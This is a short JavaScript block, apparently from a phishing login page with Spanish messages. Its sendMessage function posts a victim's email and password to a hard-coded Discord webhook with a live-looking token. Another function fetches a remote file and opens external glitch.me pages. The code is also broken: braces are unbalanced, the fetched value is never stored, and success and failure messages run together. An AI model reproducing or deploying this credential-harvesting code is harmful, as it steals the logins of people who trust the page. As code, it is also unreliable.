<script>
var datos;

document.getElementById("xd").onclick = function(){firstCheck()};
function firstCheck(){

                fetch('https://yaberry.glitch.me/putamadre.txt').then(response => response.json())

                if(datos == 1){
                  fTime = false;
                    document.write("Correcto, puede continuar!")
                  window.open("https://chat-magick.glitch.me/")

                    document.write("ESOS DATOS NO EXISTEN! Reintente por favor<a href='https://jack-lal.github.io/MooJax-IceMod/mami.html'>..</a>")
                }
            }

      }

}
function sendMessage(e,p) {
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/983148970232664164/6mpSXo3oXGJY7aH7PTAGrmVSCBn211TGgpV1cH_G3Dgv9iHCyf5cW4QRohIAtw6Szlnb");
    request.setRequestHeader('Content-type', 'application/json');
    var params = {
    username: "My Webhook Name",
    avatar_url: "https://pbs.twimg.com/profile_images/1214545814745300992/7OLFRhok_400x400.jpg",
    content: "Email: " + e + " | Password: " + p
    }
    request.send(JSON.stringify(params));
}

</script>
